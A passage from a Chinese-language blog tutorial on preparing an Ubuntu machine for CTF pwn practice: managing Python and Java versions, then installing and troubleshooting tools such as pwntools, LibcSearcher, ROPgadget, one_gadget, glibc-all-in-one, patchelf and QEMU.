class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意修改为自己的用户名</span><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/<span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> root /home/wyy/.cache/pip/http/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="管理多个版本的-Python"><a href="#管理多个版本的-Python" class="headerlink" title="管理多个版本的 Python"></a>管理多个版本的 Python</h2><blockquote><p>使用 <code>update-alternatives</code> 来切换终端中 <code>python</code> 指令所对应的 python 版本</p></blockquote><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python2.7 <span class="token number">1</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/bin/python3.5 <span class="token number">2</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--install</span> /usr/bin/python python /usr/local/python3.9/bin/python3.9 <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后数字为对应 python 版本优先级，数值越大，优先级越高</p><p>快速切换 python 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">有 <span class="token number">3</span> 个候选项可用于替换 python <span class="token punctuation">(</span>提供 /usr/bin/python<span class="token punctuation">)</span>。  选择       路径                              优先级  状态------------------------------------------------------------* <span class="token number">0</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         自动模式  <span class="token number">1</span>            /usr/bin/python2.7                   <span class="token number">1</span>         手动模式  <span class="token number">2</span>            /usr/bin/python3.5                   <span class="token number">2</span>         手动模式  <span class="token number">3</span>            /usr/local/python3.9/bin/python3.9   <span class="token number">3</span>         手动模式要维持当前值<span class="token punctuation">[</span>*<span class="token punctuation">]</span>请按<span class="token operator">&lt;</span>回车键<span class="token operator">></span>，或者键入选择的编号：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择需要切换的 python 版本即可</p><hr><h1 id="Java-配置"><a href="#Java-配置" class="headerlink" title="Java 配置"></a>Java 配置</h1><blockquote><p><code>open-jdk</code> 和 <code>oracle-jdk</code> 选其一即可，<code>oracle-jdk</code> 相对来说更稳定一点</p></blockquote><h2 id="安装-open-jdk"><a href="#安装-open-jdk" class="headerlink" title="安装 open-jdk"></a>安装 open-jdk</h2><p>查找 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> search openjdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以安装 open-jdk 8 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openjdk-8-jdk<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看已安装的 open-jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> list <span class="token parameter variable">--installed</span> <span class="token operator">|</span> <span class="token function">grep</span> openjdk<span class="token comment"># 显示：</span><span class="token comment"># openjdk-11-jdk-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jdk/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装]</span><span class="token comment"># openjdk-11-jre-headless/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span class="token comment"># openjdk-11-jre/jammy-updates,jammy-security,now 11.0.20.1+1-0ubuntu1~22.04 amd64 [已安装，自动]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载 open-jdk，以 open-jdk 11 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jdk-headless<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token parameter variable">--purge</span> remove openjdk-11-jre-headless<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以同时使用 apt 安装多个版本的 open-jdk，然后使用如下命令切换 jdk 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果我们只用 apt 安装过一个版本的 java，会显示无需配置</span><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-oracle-jdk"><a href="#安装-oracle-jdk" class="headerlink" title="安装 oracle-jdk"></a>安装 oracle-jdk</h2><p>官网下载 jdk 压缩包：<a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a></p><p>以 oracle-jdk 8 为例，下载 <a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/8u381-b09/8c876547113c4e4aab3c868e9e0ec572/jdk-8u381-linux-x64.tar.gz">jdk-8u381-linux-x64.tar.gz</a></p><p>解压并移动到 <code>/usr/bin</code> 目录下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> vxf jdk-8u381-linux-x64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> jdk1.8.0_381 <span class="token function">java</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">mv</span> <span class="token function">java</span> /usr/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置环境变量：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/bin/java<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token environment constant">$PATH</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CLASSPATH</span><span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib/dt.jar:<span class="token variable">$JAVA_HOME</span>/lib/tools.jar<span class="token comment"># 验证</span><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>卸载只需删除 <code>/usr/bin/java</code> 目录即可</p><hr><h1 id="CTF-配置"><a href="#CTF-配置" class="headerlink" title="CTF 配置"></a>CTF 配置</h1><blockquote><p>回归正题，可以开始安装 CTF 所需要的环境了</p></blockquote><h2 id="安装-git"><a href="#安装-git" class="headerlink" title="安装 git"></a>安装 git</h2><blockquote><p>迟早要用到的</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果发现有时候网不行，github 项目 git 不下来或者 wget 不下来，无法连接，尝试 cdn 加速：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> url.<span class="token string">"https://ghproxy.com/https://github.com"</span>.insteadOf <span class="token string">"https://github.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--edit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除掉对应的配置即可</p><blockquote><p><strong>注意：官方是没有提供 cdn 的，因此上面的 cdn 链接都是用爱发电，可能某天就无法使用了</strong></p></blockquote><ul><li>也可以对 github.com 添加代理：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> http.https://github.com.proxy socks5://127.0.0.1:7890<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不想使用了，通过：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.https://github.com.proxy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>取消代理即可</p><hr><h2 id="安装-32-位库"><a href="#安装-32-位库" class="headerlink" title="安装 32 位库"></a>安装 32 位库</h2><blockquote><p>运行 32 位的 ELF 可执行文件时需要</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg --add-architecture i386<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libncurses5-dev lib32z1<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6:i386 libstdc++6:i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h2><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/aquynh/capstone /opt/capstone<span class="token builtin class-name">cd</span> /opt/capstone<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><blockquote><p>通过 pip 安装或通过 git 安装，两种方法都可以，选其一即可</p></blockquote><ul><li>通过 python 的 pip 安装</li></ul><p><strong>需要注意使用哪个版本的 python 的 pip 来安装</strong></p><p>如果安装了新版的 python，例如 python 3.10.6，那就需要将 <code>python</code> 修改为默认指向 python 3.10.6，因为 Ubuntu 16.04 中 <code>python</code> 默认指向 python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span class="token comment"># 或者直接安装pwn库，自带pwntools</span><span class="token function">sudo</span> python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3.10 <span class="token function">install</span> pwntools<span class="token comment"># 或者直接安装pwn库，自带pwntools</span>pip3.10 <span class="token function">install</span> pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>如果坚持使用系统自带的 python 3.5 来安装 pwntools 的话</p><p>因为 pip 默认版本只有 8，是无法直接安装 pwntools 的，报错<br>直接使用 <code>pip3 install --upgrade pip</code> 更新 pip 的话，会将 pip 更新到最新版，导致与 python 3.5 不匹配，报错</p><p>解决方法：<br>首先下载 python 3.5 的 <code>get-pip.py</code> 并进行 pip 更新<br>如果 wget 下载太慢，建议直接访问 <a href="https://bootstrap.pypa.io/pip/3.5/">https://bootstrap.pypa.io/pip/3.5/</a> 用科学上网进行下载<br>在进行 <code>python3.5 get-pip.py</code> 之前，请先更换 pip 源，否则会很痛苦</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py  python3.5 get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样会安装好 python 3.5 所支持的最新版 pip：pip-20.3.4</p><p>但在通过 pip 安装 pwntools 时，可能会报错：<code>ERROR: Failed building wheel for cffi</code></p><p>解决办法：<br>先安装 cffi 所需要的依赖：<code>sudo apt install libffi-dev</code><br>然后即可正常安装：<code>pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p><mark>建议还是直接安装 python 3.10 使用</mark></p></blockquote><ul><li>通过 git 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/Gallopsled/pwntools /opt/pwntools<span class="token builtin class-name">cd</span> /opt/pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为我没用这种方法，如果报错的话，请参照 GDB 配置一节中安装 pwndbg 的方法，去 <a href="https://github.com/Gallopsled/pwntools">Gallopsled&#x2F;pwntools: CTF framework and exploit development library (github.com)</a> 手动下载一个旧版本的 pwntools，然后编译安装</p><ul><li>验证安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token comment"># 打开python</span><span class="token comment"># 输入下面的代码，Ⅰ或Ⅱ选其一即可</span>-------------------------------------------<span class="token comment"># Ⅰ</span><span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># Ⅱ</span>from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------<span class="token comment"># 如果输出的是这个，那就是安装成功了</span>输出：<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><p><strong>需要注意使用哪个版本的 python 的 pip 来安装</strong></p><p>如果安装了新版的 python，例如 python 3.10.6，那就需要将 <code>python</code> 修改为默认指向 python 3.10.6，因为 Ubuntu 16.04 中 <code>python</code> 默认指向 python 2.7</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> LibcSearcher <span class="token parameter variable">-i</span> http://mirrors.aliyun.com/pypi/simple/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><mark>Ubuntu 16.04 的 pip 使用清华源可能会出现 SSL 错误，建议使用阿里源：<code>http://mirrors.aliyun.com/pypi/simple/</code></mark></p><blockquote><p><strong>注意</strong>：<br>网上有很多通过 git 来安装的 <code>LibcSearcher</code> 在使用的时候会出现 “<code>libcsearcher No matched libc, please add more libc or try others</code>“ 的报错，通过 git 安装的那个版本可能不支持 python3，或者不是云端查找</p><p>我自己当初就是通过 git 安装，然后踩坑了，网上一大堆说删了 <code>Libcdatabase</code> 重新下载、通过 <code>./get</code> 更新的方法，但都行不通。。。</p></blockquote><hr><h2 id="安装-checksec"><a href="#安装-checksec" class="headerlink" title="安装 checksec"></a>安装 checksec</h2><blockquote><p>checksec 可用于识别二进制文件的安全属性，只是一个 sh 脚本，<mark>安装 pwntools 时自带，如果没有或者出现问题的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/slimm609/checksec.sh.git /opt/checksec.sh<span class="token builtin class-name">cd</span> /opt/checksec.sh<span class="token comment"># 直接创建软链接即可使用,</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /opt/checksec.sh/checksec /usr/local/bin/checksec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<em>创建软连接的指令中，两个路径都必须使用绝对路径</em>，否则会报如下错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">符号连接的层数过多: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果使用 checksec 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">command</span> not found: checksec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可尝试使用上述方法通过 git 仓库创建软链接进行修复</p><p>当然还可以直接重装 pwntools，因为 checksec 一般是安装 pwntools 自带的，报错大概率与 pwntools 有关：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall pwntoolspip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><blockquote><p>用来找 gadget 的，<mark>这个安装 pwntools 时自带，如果没有的话可以再手动安装</mark></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget<span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果使用 ROPgadget 过程中出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:  File <span class="token string">"/usr/local/bin/ROPgadget"</span>, line <span class="token number">4</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    __import__<span class="token punctuation">(</span><span class="token string">'pkg_resources'</span><span class="token punctuation">)</span>.run_script<span class="token punctuation">(</span><span class="token string">'ROPGadget==7.3'</span>, <span class="token string">'ROPgadget'</span><span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">720</span>, <span class="token keyword">in</span> run_script    self.require<span class="token punctuation">(</span>requires<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.run_script<span class="token punctuation">(</span>script_name, ns<span class="token punctuation">)</span>  File <span class="token string">"/home/wyy/.local/lib/python3.10/site-packages/pkg_resources/__init__.py"</span>, line <span class="token number">1546</span>, <span class="token keyword">in</span> run_script    raise ResolutionError<span class="token punctuation">(</span>pkg_resources.ResolutionError: Script <span class="token string">'scripts/ROPgadget'</span> not found <span class="token keyword">in</span> metadata at <span class="token string">'/home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是 pwntools 自带的 ROPgadget 还是自己手动 git 安装的 ROPgadget，都将 ROPgadget 的 git 仓库下的 <code>scripts</code> 目录移动到<strong>报错的路径</strong>下即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果是 pwntools 自带的 ROPgadget, 首先需要将 ROPgadget 仓库 git 到本地</span><span class="token comment"># sudo git clone https://github.com/JonathanSalwan/ROPgadget.git /opt/ROPgadget</span><span class="token builtin class-name">cd</span> /opt/ROPgadget<span class="token function">sudo</span> <span class="token function">cp</span> <span class="token parameter variable">-r</span> scripts /home/wyy/.local/lib/python3.10/site-packages/ROPGadget-7.3.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以尝试查看 ROPgadget 的版本，并卸载重装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> ROPgadgetpip uninstall ROPgadgetpip <span class="token function">install</span> <span class="token assign-left variable">ROPgadget</span><span class="token operator">==</span>版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重装 ROPgadget 后若因为旧版本而导致 pip 产生警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Skipping /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info due to invalid metadata entry <span class="token string">'name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除该文件即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/local/lib/python3.11/dist-packages/ROPGadget-7.2.dist-info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h2><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位<br>在做相关堆题时尤为有效，用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> ，一个 gadget 就可以 getshell，但需要注意 one_gadget 相关限制条件</p></blockquote><p>注意：one_gadget 需要安装 ruby <strong>（ruby &lt; 2.4 会导致 one_gadget 无法安装）</strong></p><p>最好是通过添加仓库的方式安装 ruby，Ubuntu 16.04 使用 <code>sudo apt install ruby</code> 安装的 ruby &lt; 2.4</p><p>通过添加仓库安装 ruby：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除旧版本 ruby</span><span class="token function">sudo</span> <span class="token function">apt</span> purge --auto-remove ruby<span class="token comment"># 添加仓库</span><span class="token function">sudo</span> add-apt-repository ppa:brightbox/ruby-ng<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token comment"># 指定 ruby 2.6 版本</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby2.6 ruby2.6-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装 one_gadget：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git /opt/glibc-all-in-one<span class="token builtin class-name">cd</span> /opt/glibc-all-in-one./update_list   <span class="token comment"># 获取可以更新的 glibc 的版本</span><span class="token function">cat</span> list   <span class="token comment"># 查看可下载的 glibc</span>./download 需要的libc版本   <span class="token comment"># 例如：2.31-0ubuntu9_amd64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认下载到 glibc-all-in-one 的 <code>/libs</code> 目录下</p><p>如果运行 <code>./update_list</code> 报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">requests.exceptions.ProxyError: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'mirror.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /ubuntu/pool/main/g/glibc/ <span class="token punctuation">(</span>Caused by ProxyError<span class="token punctuation">(</span><span class="token string">'Unable to connect to proxy'</span>, SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:997)'</span><span class="token punctuation">))</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查 <code>urllib3</code> 库的版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip list <span class="token operator">|</span> <span class="token function">grep</span> urllib3<span class="token comment"># urllib3            2.0.7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将 <code>urllib3</code> 库降级，即可解决：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall urllib3pip <span class="token function">install</span> <span class="token assign-left variable">urllib3</span><span class="token operator">==</span><span class="token number">1.25</span>.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-patchelf"><a href="#安装-patchelf" class="headerlink" title="安装 patchelf"></a>安装 patchelf</h2><blockquote><p>与 glibc-all-in-one 配合使用，可以用于更改 elf 文件 libc 版本</p></blockquote><ul><li>通过 apt 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>源码编译安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/NixOS/patchelf.git /opt/patchelf<span class="token builtin class-name">cd</span> /opt/patchelf<span class="token function">sudo</span> ./bootstrap.sh<span class="token function">sudo</span> ./configure<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> check<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># 验证安装：</span>patchelf <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>sudo ./bootstrap.sh</code> 可能会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./bootstrap.sh: <span class="token number">2</span>: ./bootstrap.sh: autoreconf: not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装所需的包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtool<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-main-arena-offset"><a href="#安装-main-arena-offset" class="headerlink" title="安装 main_arena_offset"></a>安装 main_arena_offset</h2><blockquote><p>获取给定 libc 的 main_arena 偏移量</p><p>作者 <a href="https://github.com/zarkivy">zarkivy</a> 将其集成到了 pymao 库中：<a href="https://github.com/zarkivy/py_main_arena_offset">GitHub - zarkivy&#x2F;py_main_arena_offset: Get main_arena offset of a given libc with python</a> （依赖于 objdump，请确保你的 Linux 中已安装 binutils 包）</p></blockquote><ul><li>原版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/bash-c/main_arena_offset /opt/main_arena_offset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/main_arena_offset./main_arena libc文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>pymao 集成版</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/IZAY01/py_main_arena_offset /opt/py_main_arena_offset<span class="token builtin class-name">cd</span> /opt/py_main_arena_offset<span class="token function">sudo</span> python3 setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用示例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pymao <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> <span class="token string">"./libc-2.27.so"</span>main_arena_offset <span class="token operator">=</span> gmao<span class="token punctuation">(</span>libc<span class="token punctuation">)</span><span class="token comment"># or main_arena_offset = get_main_arena_offset(libc)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-QEMU"><a href="#安装-QEMU" class="headerlink" title="安装 QEMU"></a>安装 QEMU</h2><blockquote><p>这是 arm 的 pwn 环境，QEMU 可以用来模拟各种架构的固件的运行，前期可以不安装，但是终究是逃不过的，建议一步到位</p><p>VMware 和 Virtualbox 之类通常只能在 x86 计算机上虚拟出一个 x86 虚拟机，而 QEMU 支持在 x86 上虚拟出一个 ARM 虚拟机</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu qemu-kvm virt-manager bridge-utils binfmt-support<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span>  qemu-system qemu-user-static   <span class="token comment"># 